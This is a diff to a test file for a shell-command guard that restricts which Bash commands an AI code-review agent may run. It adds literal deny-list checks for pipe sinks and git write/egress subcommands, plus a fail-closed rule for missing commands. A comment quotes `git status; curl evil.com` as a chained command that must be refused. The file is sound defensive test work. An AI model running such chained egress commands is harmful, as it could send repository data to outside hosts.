@@ -10,7 +10,7 @@
  * git show HEAD` is what models naturally write and must work, while
  * `git status; curl evil.com` must not.
  */
-import { analyseCommand, detectShellChaining, shellChainingNote, shellGuardNote, bashAllowRules, BASH_POLICY } from "../src/shell-guard.js";
+import { analyseCommand, detectShellChaining, shellChainingNote, shellGuardNote, bashAllowRules, BASH_POLICY, PIPE_SINKS } from "../src/shell-guard.js";
 import { reviewAllowedTools } from "../src/prompt.js";
 import { spawnSync } from "node:child_process";
 import fs from "node:fs";
@@ -259,15 +259,46 @@ check("whitespace allowed", analyseCommand("   ").ok, true);
 check("undefined allowed", analyseCommand(undefined).ok, true);
 check("null allowed", analyseCommand(null).ok, true);
 
+/* ---- dangerous entries must stay OUT of the allow tables (audit Q7/Q11) ----
+ * The round-trip block below builds its commands from the SAME table it asserts
+ * on: re-adding `sed` to PIPE_SINKS would still make every one of those checks
+ * pass. These expectations are written down literally (not derived from the
+ * policy), so widening the policy has to be a deliberate edit here. The live
+ * hook-process checks elsewhere in this file are the behavioural lock. */
+check("pipe sinks are exactly the reviewed set (sed must never come back)",
+  [...PIPE_SINKS].sort(), ["cat", "cut", "grep", "head", "sort", "tail", "tr", "uniq", "wc"]);
+for (const sink of ["sed", "awk", "tee", "xargs", "sh", "bash", "node", "python"]) {
+  check(`refused pipe sink is not allow-listed: ${sink}`, PIPE_SINKS.has(sink), false);
+}
+check("sed -n after a pipe is still refused (Q11: sed is not a sink)",
+  analyseCommand("git show HEAD:src/a.js | sed -n '1,5p'", OPTS).ok, false);
+check("sed -i after a pipe is refused",
+  analyseCommand("git diff | sed -i 's/a/b/'", OPTS).ok, false);
+// A write/egress git subcommand must never become a BASH_POLICY prefix: the
+// table is a whitelist, and one added prefix would grant it to the model too
+// (bashAllowRules renders straight into reviewAllowedTools).
+{
+  const gitPrefixes = (BASH_POLICY.find((p) => p.prog === "git")?.prefixes ?? []).map((p) => p.words.join(" "));
+  for (const sub of ["clone", "fetch", "push", "checkout", "switch", "reset", "clean", "commit", "config", "rm"]) {
+    check(`write/egress git subcommand is not a policy prefix: git ${sub}`,
+      gitPrefixes.some((p) => p === sub || p.startsWith(sub + " ")), false);
+  }
+}
+
 /* ---- the policy table is the single source of truth ---- */
 {
   const rules = bashAllowRules();
   const fromPrompt = reviewAllowedTools().filter((r) => r.startsWith("Bash(") && r !== "Bash(cd:*)");
+  // Consistency check (audit Q7): both sides are the PRODUCT's tables, so this
+  // proves prompt.js and shell-guard.js agree on the surface — not that any
+  // individual rule is safe. Safety is covered by the literal expectations above
+  // and by the hook-process checks below.
   check("prompt allowlist contains exactly the policy rules", fromPrompt.length, rules.length);
   check("every policy rule is in the prompt allowlist", rules.every((r) => reviewAllowedTools().includes(r)), true);
   check("cd is granted to the permission engine (the hook polices it)", reviewAllowedTools().includes("Bash(cd:*)"), true);
   // Every program named by the policy must also be analyzable: a segment built
-  // from a rule is allowed by analyseCommand.
+  // from a rule is allowed by analyseCommand. (Table-consistency round trip; it
+  // cannot detect a dangerous rule being ADDED — see the literal block above.)
   for (const { prog, prefixes } of BASH_POLICY) {
     for (const p of prefixes) {
       const cmd = [prog, ...p.words].join(" ");
@@ -401,7 +432,13 @@ check("hook: write to a not-yet-existing file inside the repo still allowed",
 try { fs.rmSync(LINK, { force: true, recursive: true }); } catch { /* best effort */ }
 try { fs.rmSync(OUTSIDE, { recursive: true, force: true }); } catch { /* best effort */ }
 check("hook: garbage stdin allowed through", hookVerdict("not json at all"), { status: 0, decision: null, reason: null });
-check("hook: missing command allowed through", hookVerdict({ tool_name: "Bash", tool_input: {} }, { CLAUDE_REVIEW_REPO_ROOT: REPO }),
+// A Bash payload with no command string cannot be inspected by the guard, so
+// the hook fails closed (audit SEC-24); an empty command string is a no-op and
+// stays allowed.
+check("hook: missing command is refused (fail closed)",
+  hookVerdict({ tool_name: "Bash", tool_input: {} }, { CLAUDE_REVIEW_REPO_ROOT: REPO }).decision, "deny");
+check("hook: empty command string allowed",
+  hookVerdict({ tool_name: "Bash", tool_input: { command: "" } }, { CLAUDE_REVIEW_REPO_ROOT: REPO }),
   { status: 0, decision: null, reason: null });
 
 /* ---- replay: real runs, both the ones that worked and the ones that wasted turns ---- */
